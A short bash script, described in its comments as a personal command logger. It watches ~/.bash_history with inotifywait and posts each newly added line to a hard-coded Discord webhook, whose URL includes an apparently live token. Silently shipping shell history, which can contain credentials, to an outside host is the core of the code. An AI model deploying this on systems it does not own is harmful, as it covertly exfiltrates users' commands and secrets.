# What this program does:
# it simply logs commands from a terminal (when we close it) and puts them into a discord channel

# How this program will work:
# 1) declare our history file + discord webhook URL
# 2) store the current items of the file
# 3) notify ourselves of when the file is modified
# 4) compare the difference (from the latest)
# 5) convert the difference to a JSON payload, and send the new items to the webhook
# 6) set the current files to the previous for the next loop

DIRECTORY="/home/$USER/.bash_history"
WEBHOOK_URL="https://discord.com/api/webhooks/1429675371904892978/1IKGnczeckls7iptXTvlgz6WmfLZ9GmlCeypZ4_4BXhjbpAI5YdkE4VDCUqEjjAe9_Bj"
COMMAND="inotifywait -m -q -r -e modify \"$DIRECTORY\""
PREVIOUS_CONTENTS=$(cat $DIRECTORY)

eval $COMMAND | while read full_path events file_name; do
    CURRENT_CONTENTS=$(cat $DIRECTORY)
    DIFFERENCE=$(diff --new-line-format='%L' --old-line-format='' --unchanged-line-format='' <(echo "$PREVIOUS_CONTENTS") <(echo "$CURRENT_CONTENTS"))
    PREVIOUS_CONTENTS="$CURRENT_CONTENTS"
    PAYLOAD=$(jq -Rn --arg payload "$DIFFERENCE" '{content:$payload}')

    curl $WEBHOOK_URL \
        -X POST \
        -H "Content-Type: application/json" \
        -d "$PAYLOAD"
done